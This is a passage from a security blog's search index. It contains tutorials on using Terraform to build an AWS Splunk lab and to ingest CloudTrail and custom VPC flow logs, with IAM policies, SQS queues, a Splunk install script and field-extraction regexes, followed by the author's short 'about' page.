\u0026#34;arn:aws:sqs:*:*:s3_event_notification_queue_flow_logs\u0026#34;, \u0026#34;Condition\u0026#34;: { \u0026#34;ArnEquals\u0026#34;: { \u0026#34;aws:SourceArn\u0026#34;: \u0026#34;${aws_s3_bucket.flow_log_bucket.arn}\u0026#34; } } } ] } POLICY } # Set up a dead-letter queue for the SQS queue to be used for the input for storing invalid messages resource \u0026#34;aws_sqs_queue\u0026#34; \u0026#34;dl_queue_flow_logs\u0026#34; { name = \u0026#34;dl_queue_flow_logs_error_messages\u0026#34; } resource \u0026#34;aws_s3_bucket_notification\u0026#34; \u0026#34;bucket_notification\u0026#34; { bucket = aws_s3_bucket.flow_log_bucket.id queue { queue_arn = aws_sqs_queue.queue_flow_logs.arn events = [\u0026#34;s3:ObjectCreated:*\u0026#34;] } } output \u0026#34;sqs_arn\u0026#34; { description = \u0026#34;The ARN of the SQS queue\u0026#34; value = aws_sqs_queue.queue_flow_logs.arn } Configure Splunk Add-on for VPC Flow logs In our previous post, we already setup the splunk environment by installing these two apps.\nSplunk Add-on for Amazon Web Services Splunk App for AWS If you haven\u0026rsquo;t already done so, I would suggest please follow the steps 8-13 on previous post\nNext, we need to update the props.conf file on Splunk Search Head for the AWS Add-on app. Location of props.conf will be located at $SPLUNK_HOME/etc/apps/SPLUNK_TA_aws/default/props.conf\nBefore\n##################################\r### AWS CloudWatch Logs ###\r##################################\r[aws:cloudwatchlogs:vpcflow]\rSHOULD_LINEMERGE = false\rEXTRACT-all=^\\s*(\\d{4}-\\d{2}-\\d{2}.\\d{2}:\\d{2}:\\d{2}[.\\d\\w]*)?\\s*(?P\u0026lt;version\u0026gt;[^\\s]+)\\s+(?P\u0026lt;account_id\u0026gt;[^\\s]+)\\s+(?P\u0026lt;interface_id\u0026gt;[^\\s]+)\\s+(?P\u0026lt;src_ip\u0026gt;[^\\s]+) \\s+(?P\u0026lt;dest_ip\u0026gt;[^\\s]+)\\s+(?P\u0026lt;src_port\u0026gt;[^\\s]+)\\s+(?P\u0026lt;dest_port\u0026gt;[^\\s]+)\\s+(?P\u0026lt;protocol_code\u0026gt;[^\\s]+)\\s+(?P\u0026lt;packets\u0026gt;[^\\s]+)\\s+(?P\u0026lt;bytes\u0026gt;[^\\s]+)\\s+(?P\u0026lt;start_time\u0026gt;[^\\s]+) \\s+(?P\u0026lt;end_time\u0026gt;[^\\s]+)\\s+(?P\u0026lt;vpcflow_action\u0026gt;[^\\s]+)\\s+(?P\u0026lt;log_status\u0026gt;[^\\s]+) After\n##################################\r### AWS CloudWatch Logs ###\r##################################\r[aws:cloudwatchlogs:vpcflow]\rSHOULD_LINEMERGE = false\rEXTRACT-all=^\\s*(\\d{4}-\\d{2}-\\d{2}.\\d{2}:\\d{2}:\\d{2}[.\\d\\w]*)?\\s*(?P\u0026lt;version\u0026gt;[^\\s]+)\\s+(?P\u0026lt;vpc_id\u0026gt;[^\\s]+)\\s+(?P\u0026lt;subnet_id\u0026gt;[^\\s]+)\\s+(?P\u0026lt;instance_id\u0026gt;[^\\s]+) \\s+(?P\u0026lt;interface_id\u0026gt;[^\\s]+)\\s+(?P\u0026lt;account_id\u0026gt;[^\\s]+)\\s+(?P\u0026lt;type\u0026gt;[^\\s]+)\\s+(?P\u0026lt;src_ip\u0026gt;[^\\s]+)\\s+(?P\u0026lt;dest_ip\u0026gt;[^\\s]+)\\s+(?P\u0026lt;src_port\u0026gt;[^\\s]+)\\s+(?P\u0026lt;dest_port\u0026gt;[^\\s]+) \\s+(?P\u0026lt;pkt_srcaddr\u0026gt;[^\\s]+)\\s+(?P\u0026lt;pkt_dstaddr\u0026gt;[^\\s]+)\\s+(?P\u0026lt;protocol_code\u0026gt;[^\\s]+)\\s+(?P\u0026lt;bytes\u0026gt;[^\\s]+)\\s+(?P\u0026lt;packets\u0026gt;[^\\s]+)\\s+(?P\u0026lt;start_time\u0026gt;[^\\s]+)\\s+(?P\u0026lt;end_time\u0026gt;[^\\s]+) \\s+(?P\u0026lt;vpcflow_action\u0026gt;[^\\s]+)\\s+(?P\u0026lt;tcp_flags\u0026gt;[^\\s]+)(?P\u0026lt;log_status\u0026gt;[^\\s]+) Login to Splunk Instance using the public IP of the EC2 instance Search for the CloudWatch logs using the SPL:\nindex=main sourcetype=aws:cloudwatchlogs:vpcflow | table version vpc_id subnet_id instance_id interface_id account_id type src_ip dest_ip src_port dest_port pkt_srcaddr pkt_dstaddr protocol_code bytes packets start_time end_time vpcflow_action tcp_flags log_status Summary: In this post, we ingested custom VPC flow logs to splunk and configured Splunk TA to correctly parse those logs. Questions and suggestions are welcome. Happy Learning.\nReferences https://docs.splunk.com/Documentation/Splunk/latest/Security/Secureyouradminaccount#Create_admin_credentials_after_starting_Splunk_Enterprise https://docs.splunk.com/Documentation/AddOns/released/AWS/Setuptheadd-on ","permalink":"https://www.logsec.cloud/posts/ingest-vpc-flow-logs-to-splunk/","summary":"In this blog post, we will learn how to ingest VPC flow logs with additional meta-data to Splunk. We will start by creating a VPC flow logs using terraform and pushing the logs to S3. From S3 ingesting these logs to Splunk using Amazon Kinesis. At last, we will make some changes to Splunk\u0026rsquo;s profs.conf file for correct field extraction for the additional VPC flow log fields.\nAll Terraform files are available to download at my GitHub Repo.","title":"Ingest VPC Flow Logs with Additional Meta-Data to Splunk"},{"content":"This blog post will walk you through setting up a Splunk environment on AWS for lab purposes using Splunk Enterprise Free 60-day trail. After 60 days you can convert to a perpetual free license or purchase a Splunk Enterprise license to continue using the expanded functionality designed for enterprise-scale deployments. There is an indexing limit of 500 MB/Day which will be more than enough for our demo purposes.\nThere are multiple ways to accomplish this - using AWS Console, CLI or using CloudFormation. For our demo purposes, we will be using Terraform by Hashicorp. Terraform is a tool for building, changing, and versioning infrastrcuture safely and efficiently.\nThis article assumes you have some familiarity with Terraform already.\nAll Terraform files are available to download at my GitHub Repo. You just need to edit the terraform.tfvars file and put your AWS ACCESS KEY ID and SECRET ACCESS KEY.\nmaven@pluto:~$ tree ./terraform/ ./terraform/ ├── cloudtrail.tf ├── module.tf ├── output.tf ├── provider.tf ├── splunk │ ├── instance_splunk.tf │ ├── splunk_iam_role.tf │ ├── splunk_iam_role_pol.json │ ├── user_data_splunk.sh │ ├── variables.tf │ └── vpc_splunk.tf ├── sqs_cloudtrail_logs.tf ├── terraform.tfvars ├── variables.tf └── versions.tf 1.\tCreate an IAM Role for the Splunk Instance and attach a policy which allows EC2 instances to call AWS services on your behalf. resource \u0026#34;aws_iam_role\u0026#34; \u0026#34;splunk_iam_role\u0026#34; { name = \u0026#34;splunk_role\u0026#34; assume_role_policy = \u0026lt;\u0026lt;EOF { \u0026#34;Version\u0026#34;: \u0026#34;2012-10-17\u0026#34;, \u0026#34;Statement\u0026#34;: [ { \u0026#34;Action\u0026#34;: \u0026#34;sts:AssumeRole\u0026#34;, \u0026#34;Principal\u0026#34;: { \u0026#34;Service\u0026#34;: \u0026#34;ec2.amazonaws.com\u0026#34; }, \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Sid\u0026#34;: \u0026#34;\u0026#34; } ] } EOF } output \u0026#34;splunk_iam_role_arn\u0026#34; { description = \u0026#34;The ARN of the Role\u0026#34; value = aws_iam_role.splunk_iam_role.arn } 2. Create an IAM Policy and attach to the Splunk IAM Role with all the required permissions to pull logs from required AWS services. resource \u0026#34;aws_iam_role_policy\u0026#34; \u0026#34;splunk_iam_policy\u0026#34; { name = \u0026#34;splunk_policy\u0026#34; role = aws_iam_role.splunk_iam_role.id policy = file(\u0026#34;${path.module}/splunk_iam_role_pol.json\u0026#34;) } Example IAM policy which will cover the majority of access splunk should need within AWS. Policy containing permisisons for all inputs is available at Splunk Docs\n{ \u0026#34;Version\u0026#34;: \u0026#34;2012-10-17\u0026#34;, \u0026#34;Statement\u0026#34;: [ { \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Action\u0026#34;: [ \u0026#34;sqs:GetQueueAttributes\u0026#34;, \u0026#34;sqs:ListQueues\u0026#34;, \u0026#34;sqs:ReceiveMessage\u0026#34;, \u0026#34;sqs:GetQueueUrl\u0026#34;, \u0026#34;sqs:SendMessage\u0026#34;, \u0026#34;sqs:DeleteMessage\u0026#34;, \u0026#34;s3:ListBucket\u0026#34;, \u0026#34;s3:GetObject\u0026#34;, \u0026#34;s3:GetBucketLocation\u0026#34;, \u0026#34;s3:ListAllMyBuckets\u0026#34;, \u0026#34;s3:GetBucketTagging\u0026#34;, \u0026#34;s3:GetAccelerateConfiguration\u0026#34;, \u0026#34;s3:GetBucketLogging\u0026#34;, \u0026#34;s3:GetLifecycleConfiguration\u0026#34;, \u0026#34;s3:GetBucketCORS\u0026#34;, \u0026#34;config:DeliverConfigSnapshot\u0026#34;, \u0026#34;config:DescribeConfigRules\u0026#34;, \u0026#34;config:DescribeConfigRuleEvaluationStatus\u0026#34;, \u0026#34;config:GetComplianceDetailsByConfigRule\u0026#34;, \u0026#34;config:GetComplianceSummaryByConfigRule\u0026#34;, \u0026#34;iam:GetUser\u0026#34;, \u0026#34;iam:ListUsers\u0026#34;, \u0026#34;iam:GetAccountPasswordPolicy\u0026#34;, \u0026#34;iam:ListAccessKeys\u0026#34;, \u0026#34;iam:GetAccessKeyLastUsed\u0026#34;, \u0026#34;autoscaling:Describe*\u0026#34;, \u0026#34;cloudwatch:Describe*\u0026#34;, \u0026#34;cloudwatch:Get*\u0026#34;, \u0026#34;cloudwatch:List*\u0026#34;, \u0026#34;sns:Get*\u0026#34;, \u0026#34;sns:List*\u0026#34;, \u0026#34;sns:Publish\u0026#34;, \u0026#34;logs:DescribeLogGroups\u0026#34;, \u0026#34;logs:DescribeLogStreams\u0026#34;, \u0026#34;logs:GetLogEvents\u0026#34;, \u0026#34;ec2:DescribeInstances\u0026#34;, \u0026#34;ec2:DescribeReservedInstances\u0026#34;, \u0026#34;ec2:DescribeSnapshots\u0026#34;, \u0026#34;ec2:DescribeRegions\u0026#34;, \u0026#34;ec2:DescribeKeyPairs\u0026#34;, \u0026#34;ec2:DescribeNetworkAcls\u0026#34;, \u0026#34;ec2:DescribeSecurityGroups\u0026#34;, \u0026#34;ec2:DescribeSubnets\u0026#34;, \u0026#34;ec2:DescribeVolumes\u0026#34;, \u0026#34;ec2:DescribeVpcs\u0026#34;, \u0026#34;ec2:DescribeImages\u0026#34;, \u0026#34;ec2:DescribeAddresses\u0026#34;, \u0026#34;lambda:ListFunctions\u0026#34;, \u0026#34;rds:DescribeDBInstances\u0026#34;, \u0026#34;cloudfront:ListDistributions\u0026#34;, \u0026#34;elasticloadbalancing:DescribeLoadBalancers\u0026#34;, \u0026#34;elasticloadbalancing:DescribeInstanceHealth\u0026#34;, \u0026#34;elasticloadbalancing:DescribeTags\u0026#34;, \u0026#34;elasticloadbalancing:DescribeTargetGroups\u0026#34;, \u0026#34;elasticloadbalancing:DescribeTargetHealth\u0026#34;, \u0026#34;elasticloadbalancing:DescribeListeners\u0026#34;, \u0026#34;inspector:Describe*\u0026#34;, \u0026#34;inspector:List*\u0026#34;, \u0026#34;kinesis:Get*\u0026#34;, \u0026#34;kinesis:DescribeStream\u0026#34;, \u0026#34;kinesis:ListStreams\u0026#34;, \u0026#34;kms:Decrypt\u0026#34;, \u0026#34;sts:AssumeRole\u0026#34; ], \u0026#34;Resource\u0026#34;: [ \u0026#34;*\u0026#34; ] } ] } 3. Create an IAM instance profile for Splunk Instance. resource \u0026#34;aws_iam_instance_profile\u0026#34; \u0026#34;splunk_instance_profile\u0026#34; { name = \u0026#34;splunk_instance_profile\u0026#34; role = aws_iam_role.splunk_iam_role.name } output \u0026#34;splunk_instance_profile_name\u0026#34; { description = \u0026#34;The instance profile\u0026#39;s name\u0026#34; value = aws_iam_instance_profile.splunk_instance_profile.name } 4. Create a CloudTrail for your AWS Account. You can create up to five trails for each region. After you create a trail, CloudTrail automatically starts logging API calls and related events in your account to the Amazon S3 bucket that you specify. To stop logging, you can turn off logging for the trail or delete it.\nresource \u0026#34;aws_cloudtrail\u0026#34; \u0026#34;lab_trail\u0026#34; { name = \u0026#34;lab_trail\u0026#34; s3_bucket_name = aws_s3_bucket.trail_bucket.id include_global_service_events = false is_multi_region_trail = false } output \u0026#34;lab_trail_id\u0026#34; { description = \u0026#34;The name of the trail\u0026#34; value = aws_cloudtrail.lab_trail.id } output \u0026#34;lab_trail_region\u0026#34; { description = \u0026#34;The region in which the trail was created\u0026#34; value = aws_cloudtrail.lab_trail.home_region } 5. Create an Amazon S3 bucket for our CloudTrail. resource \u0026#34;aws_s3_bucket\u0026#34; \u0026#34;trail_bucket\u0026#34; { bucket = \u0026#34;${data.aws_caller_identity.current.account_id}-lab-cloudtrail-logs\u0026#34; force_destroy = true policy = \u0026lt;\u0026lt;POLICY { \u0026#34;Version\u0026#34;: \u0026#34;2012-10-17\u0026#34;, \u0026#34;Statement\u0026#34;: [ { \u0026#34;Sid\u0026#34;: \u0026#34;AWSbucketAclCheck\u0026#34;, \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Principal\u0026#34;: { \u0026#34;Service\u0026#34;: \u0026#34;cloudtrail.amazonaws.com\u0026#34; }, \u0026#34;Action\u0026#34;: \u0026#34;s3:GetBucketAcl\u0026#34;, \u0026#34;Resource\u0026#34;: \u0026#34;arn:aws:s3:::${data.aws_caller_identity.current.account_id}-lab-cloudtrail-logs\u0026#34; }, { \u0026#34;Sid\u0026#34;: \u0026#34;AWSbucketWrite\u0026#34;, \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Principal\u0026#34;: { \u0026#34;Service\u0026#34;: \u0026#34;cloudtrail.amazonaws.com\u0026#34; }, \u0026#34;Action\u0026#34;: \u0026#34;s3:PutObject\u0026#34;, \u0026#34;Resource\u0026#34;: \u0026#34;arn:aws:s3:::${data.aws_caller_identity.current.account_id}-lab-cloudtrail-logs/AWSLogs/${data.aws_caller_identity.current.account_id}/*\u0026#34;, \u0026#34;Condition\u0026#34;: { \u0026#34;StringEquals\u0026#34;: { \u0026#34;s3:x-amz-acl\u0026#34;: \u0026#34;bucket-owner-full-control\u0026#34; } } } ] } POLICY } output \u0026#34;trail_bucket_id\u0026#34; { description = \u0026#34;The name of the bucket\u0026#34; value = aws_s3_bucket.trail_bucket.id } output \u0026#34;trail_bucket_region\u0026#34; { description = \u0026#34;The ARN of the bucket\u0026#34; value = aws_s3_bucket.trail_bucket.arn } 6. Create two SQS Queues. Now it\u0026rsquo;s time to create the SQS queues. Two queues will be required. One queue will be the dead letter queue for error messages to be kicked over to and the other will be the queue used to capture the S3 notifications when a new Cloud trail event is sent to the S3 bucket we created in earlier step.\n# Add Amazon S3 Event Notification configuration to SQS Queue resource \u0026#34;aws_sqs_queue\u0026#34; \u0026#34;queue\u0026#34; { name = \u0026#34;s3_event_notification_queue\u0026#34; visibility_timeout_seconds = 300 redrive_policy = jsonencode({ deadLetterTargetArn = aws_sqs_queue.dl_queue.arn maxReceiveCount = 1 }) policy = \u0026lt;\u0026lt;POLICY { \u0026#34;Version\u0026#34;: \u0026#34;2012-10-17\u0026#34;, \u0026#34;Statement\u0026#34;: [ { \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Principal\u0026#34;: \u0026#34;*\u0026#34;, \u0026#34;Action\u0026#34;: \u0026#34;sqs:SendMessage\u0026#34;, \u0026#34;Resource\u0026#34;: \u0026#34;arn:aws:sqs:*:*:s3_event_notification_queue\u0026#34;, \u0026#34;Condition\u0026#34;: { \u0026#34;ArnEquals\u0026#34;: { \u0026#34;aws:SourceArn\u0026#34;: \u0026#34;${aws_s3_bucket.trail_bucket.arn}\u0026#34; } } } ] } POLICY } # Set up a dead-letter queue for the SQS queue to be used for the input for storing invalid messages resource \u0026#34;aws_sqs_queue\u0026#34; \u0026#34;dl_queue\u0026#34; { name = \u0026#34;dl_queue_error_messages\u0026#34; } resource \u0026#34;aws_s3_bucket_notification\u0026#34; \u0026#34;bucket_notification\u0026#34; { bucket = aws_s3_bucket.trail_bucket.id queue { queue_arn = aws_sqs_queue.queue.arn events = [\u0026#34;s3:ObjectCreated:*\u0026#34;] } } output \u0026#34;sqs_arn\u0026#34; { description = \u0026#34;The ARN of the SQS queue\u0026#34; value = aws_sqs_queue.queue.arn } 7. Create an Amazon VPC for our Splunk Splunk Instance Please note this step is not mandatory, you can use the default VPC as well. In this step we will demonstate how to setup our own VPC, a public subnet, an Internet Gateway along with a route table.\n# VPC resource \u0026#34;aws_vpc\u0026#34; \u0026#34;splunk_vpc\u0026#34; { cidr_block = \u0026#34;192.168.0.0/24\u0026#34; enable_dns_hostnames = \u0026#34;true\u0026#34; instance_tenancy = \u0026#34;default\u0026#34; tags = { Name = \u0026#34;splunk_vpc\u0026#34; } } output \u0026#34;splunk_vpc_arn\u0026#34; { description = \u0026#34;The ARN of the VPC\u0026#34; value = aws_vpc.splunk_vpc.arn } output \u0026#34;splunk_vpc_id\u0026#34; { description = \u0026#34;The ID of the VPC\u0026#34; value = aws_vpc.splunk_vpc.id } # Public Subnet resource \u0026#34;aws_subnet\u0026#34; \u0026#34;splunk_subnet_public\u0026#34; { vpc_id = aws_vpc.splunk_vpc.id cidr_block = \u0026#34;192.168.0.0/24\u0026#34; map_public_ip_on_launch = \u0026#34;true\u0026#34; availability_zone = \u0026#34;us-east-1a\u0026#34; tags = { Name = \u0026#34;splunk_subnet_public\u0026#34; } } output \u0026#34;splunk_subnet_public\u0026#34; { description = \u0026#34;The ID of the public subnet\u0026#34; value = aws_subnet.splunk_subnet_public.id } # Internet GW resource \u0026#34;aws_internet_gateway\u0026#34; \u0026#34;splunk_gw\u0026#34; { vpc_id = aws_vpc.splunk_vpc.id tags = { Name = \u0026#34;splunk_gw\u0026#34; } } output \u0026#34;splunk_gw\u0026#34; { description = \u0026#34;The ID of the IGW\u0026#34; value = aws_internet_gateway.splunk_gw.id } # Route Table resource \u0026#34;aws_route_table\u0026#34; \u0026#34;splunk_route_table\u0026#34; { vpc_id = aws_vpc.splunk_vpc.id route { cidr_block = \u0026#34;0.0.0.0/0\u0026#34; gateway_id = aws_internet_gateway.splunk_gw.id } tags = { Name = \u0026#34;splunk_route_table\u0026#34; } } output \u0026#34;splunk_route_table\u0026#34; { description = \u0026#34;The ID of the routing table\u0026#34; value = aws_route_table.splunk_route_table.id } # Associate Route Table and Subnet resource \u0026#34;aws_route_table_association\u0026#34; \u0026#34;splunk_route_table_subnet_public\u0026#34; { subnet_id = aws_subnet.splunk_subnet_public.id route_table_id = aws_route_table.splunk_route_table.id } 8. Create an EC2 Instance of the latest Ubuntu 18.04 on a t2.medium node. Now, let\u0026rsquo;s create an instance where we will use the user_data argument to pass our bash script which will download and install Splunk Enterprise for us.\ndata \u0026#34;aws_ami\u0026#34; \u0026#34;ubuntu_server\u0026#34; { most_recent = true owners = [\u0026#34;099720109477\u0026#34;] # Canonical filter { name = \u0026#34;name\u0026#34; values = [\u0026#34;ubuntu/images/hvm-ssd/ubuntu-bionic-18.04-amd64-server-*\u0026#34;] } filter { name = \u0026#34;virtualization-type\u0026#34; values = [\u0026#34;hvm\u0026#34;] } } resource \u0026#34;aws_instance\u0026#34; \u0026#34;splunk_instance\u0026#34; { ami = data.aws_ami.ubuntu_server.id iam_instance_profile = aws_iam_instance_profile.splunk_instance_profile.name instance_type = \u0026#34;t2.medium\u0026#34; key_name = \u0026#34;lab_kp\u0026#34; # VPC subnet_id = aws_subnet.splunk_subnet_public.id # SG vpc_security_group_ids = [aws_security_group.splunk_sg.id] root_block_device { volume_type = \u0026#34;gp2\u0026#34; volume_size = 16 } user_data = file(\u0026#34;${path.module}/user_data_splunk.sh\u0026#34;) tags = { Name = \u0026#34;splunk\u0026#34; } } output \u0026#34;splunk_instance_id\u0026#34; { description = \u0026#34;Instance ID\u0026#34; value = aws_instance.splunk_instance.id } output \u0026#34;splunk_instance_public_ip\u0026#34; { description = \u0026#34;Public IP\u0026#34; value = aws_instance.splunk_instance.public_ip } output \u0026#34;splunk_instance_private_ip\u0026#34; { description = \u0026#34;Private IP\u0026#34; value = aws_instance.splunk_instance.private_ip } # SG resource \u0026#34;aws_security_group\u0026#34; \u0026#34;splunk_sg\u0026#34; { description = \u0026#34;Allow SSH inbound traffic\u0026#34; vpc_id = aws_vpc.splunk_vpc.id ingress { description = \u0026#34;Splunk Port 8000 from Home Netowrk\u0026#34; from_port = 8000 to_port = 8000 protocol = \u0026#34;tcp\u0026#34; cidr_blocks = [\u0026#34;${var.home_ip}/32\u0026#34;] } ingress { description = \u0026#34;SSH from Home Netowrk\u0026#34; from_port = 22 to_port = 22 protocol = \u0026#34;tcp\u0026#34; cidr_blocks = [\u0026#34;${var.home_ip}/32\u0026#34;] } egress { from_port = 0 to_port = 0 protocol = \u0026#34;-1\u0026#34; cidr_blocks = [\u0026#34;0.0.0.0/0\u0026#34;] } tags = { Name = \u0026#34;splunk_sg\u0026#34; } } output \u0026#34;splunk_sg\u0026#34; { description = \u0026#34;The ID of the security group\u0026#34; value = aws_security_group.splunk_sg.id } User Data: When you install Splunk Enterprise, you must create a username and password for your administrator account. We will create admin credentials using the --gen-and-print-passwd CLI arguments.\n#! /bin/bash -xe exec \u0026gt; \u0026gt;(tee /var/log/user-data.log|logger -t user-data -s 2\u0026gt;/dev/console) 2\u0026gt;\u0026amp;1 echo BEGIN sudo apt-get update sudo apt-get upgrade -y cd /tmp \u0026amp;\u0026amp; wget -O splunk-8.0.3-a6754d8441bf-linux-2.6-amd64.deb \u0026#39;https://www.splunk.com/bin/splunk/DownloadActivityServlet?architecture=x86_64\u0026amp;platform=linux\u0026amp;version=8.0.3\u0026amp;product=splunk\u0026amp;filename=splunk-8.0.3-a6754d8441bf-linux-2.6-amd64.deb\u0026amp;wget=true\u0026#39; cd /opt sudo dpkg -i /tmp/splunk-8.0.3-a6754d8441bf-linux-2.6-amd64.deb cd splunk/ /opt/splunk/bin/splunk start --accept-license --answer-yes --no-prompt --gen-and-print-passwd echo END 9. Login to Splunk Instance using the public IP of the EC2 instance Browse to http://public_ip:8000\nusername: admin\npassword: You need to grab from the file /var/log/user-data.log\nIt will be randomly generated as we used the option --gen-and-print-passwd\n10. Install these two apps on the Splunk Instance. Splunk Add-on for Amazon Web Services Splunk App for AWS Once the apps are installed, restart Splunk.\n11. Go to App: Splunk Add-on for AWS and go under the \u0026ldquo;Configuration\u0026rdquo; tab, you\u0026rsquo;ll see Role Assigned to the Splunk instance will populate in a couple of seconds. 12. Go to \u0026ldquo;Inputs\u0026rdquo; tab Create a New Input selectng Data Type CloudTrail and Input Type SQS-Based S3\n13. Fill out the AWS Input Configuration details Please note under the AWS Account, name of the role assigned to the Instance will automatically show up. For the SQS Queue Name, you will see two SQS queues we created in earlier post. Please select the Event Notification Queue. For the Index, either you can create a new index for CloudTrail logs or using existing one. 14. Go to Search \u0026amp; Reporting App Search for the CloudTrail logs using the SPL:\nindex=main sourcetype=\u0026#34;aws:cloudtrail\u0026#34;\r| table _time eventSource eventName eventType errorCode awsRegion userIdentity.accountId Summary: In this post, we learnt how to setup up a Splunk environment on AWS for lab purposes. We used Terraform to setup the AWS environment and then manually configured Splunk to integrate the CloudTrail logs.\nReferences https://docs.splunk.com/Documentation/Splunk/latest/Security/Secureyouradminaccount#Create_admin_credentials_after_starting_Splunk_Enterprise https://docs.splunk.com/Documentation/AddOns/released/AWS/Setuptheadd-on ","permalink":"https://www.logsec.cloud/posts/ingest-cloudtrail-logs-to-splunk/","summary":"This blog post will walk you through setting up a Splunk environment on AWS for lab purposes using Splunk Enterprise Free 60-day trail. After 60 days you can convert to a perpetual free license or purchase a Splunk Enterprise license to continue using the expanded functionality designed for enterprise-scale deployments. There is an indexing limit of 500 MB/Day which will be more than enough for our demo purposes.\nThere are multiple ways to accomplish this - using AWS Console, CLI or using CloudFormation.","title":"Ingest AWS CloudTrail logs to Splunk"},{"content":"I\u0026rsquo;m Harwinder Sandhu, a Cyber Security Consultant. Purpose of this site is to organize everything I have learned and want to learn in this field, and share those things with others. I welcome you to EXPLORE, and I hope you find something here worth your time.\nCertifications 🎓 Check Point Certified Security Expert (CCSE) Check Point Certified Security Administrator (CCSA) ","permalink":"https://www.logsec.cloud/pages/about/","summary":"I\u0026rsquo;m Harwinder Sandhu, a Cyber Security Consultant. Purpose of this site is to organize everything I have learned and want to learn in this field, and share those things with others. I welcome you to EXPLORE, and I hope you find something here worth your time.\nCertifications 🎓 Check Point Certified Security Expert (CCSE) Check Point Certified Security Administrator (CCSA) ","title":"Hi there 👋"}]